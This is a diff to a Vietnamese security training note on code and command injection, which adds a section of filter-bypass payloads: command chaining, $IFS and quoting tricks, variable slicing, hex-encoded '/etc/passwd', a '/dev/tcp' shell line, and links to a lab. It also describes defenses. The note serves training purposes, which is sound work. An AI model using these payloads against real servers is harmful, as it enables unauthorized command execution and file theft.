@@ -13,10 +13,31 @@ Nguyên nhân chính của `code injection` là việc không kiểm tra đầu 
 ### Tác hại 
 - Tác hại của `code injection` có thể rất nghiêm trọng. Kẻ tấn công có thể truy cập và thay đổi dữ liệu, lấy cắp thông tin nhạy cảm, thực hiện các hành động trái phép trên hệ thống máy chủ, thậm chí kiểm soát toàn bộ máy chủ.
 - Ngoài ra còn có thể dẫn đến các cuộc tấn công khác như: SQL injection, XXS, Command injection, ...
+### Bypass:
+- Exploit: `; ls` `&& ls`, `| ls`, `|| ls`,...
+- Bypass space:
+  - Sử dụng `<`: `cat</etc/passwd`
+  - Sử dụng `$IFS`: `cat$IFS/etc/passwd`
+  - Hoặc dùng shell: `sh</dev/tcp/127.0.0.1/4242`
+  - ...
+- Bypass words:
+  - quote: `w'h'o'am'i`, `w"h"o"am"i`
+  - blackslash, slash: `w\ho\am\i`, `/\b\i\n/////s\h`
+  - $@: `who$()ami`
+  - $(): `who$()ami`
+  - `/usr/bin/who*mi` => `/usr/bin/whoami`
+  - `$0` => bash
+- Bypass characters:
+  - `${HOME:0:1}`, `. | tr '!-0' '"-1'`, `${PATH:0:1}` => `/`
+  - `${LS_COLORS:10:1}` => `;`
+- Encoding hex: `\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64`, `2f6574632f706173737764` => `/etc/passwd`
+- RCE with 4 or 5 char: <a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#rce-with-5-chars">here</a>
 ### Cách phòng chống
 - Xác thực đầu vào như sử dụng whitelist: chỉ cho phép các từ kiểm soát được.
 - Mã hóa: escape HTML entities để hạn chế nguy cơ thành mã độc hoặc mã hóa dữ liệu bằng cách khác trước khi được lưu trữ hoặc chuyển lên internet.
 - Sử dụng tường lửa, các công cụ phát hiện tấn công và thường xuyên cập nhật thư viện an toàn.
+### Lab
+<a href="https://github.com/caodchuong312/KCSC-Training/tree/main/task10/CommandInjectionLab">lab</a>
 # Commmand Injection
 ### Khái niệm
 Command injection là lỗ hổng mà kẻ tấn công có thể thực thi câu lệnh hệ điều hành trên máy chủ của ứng dụng đó
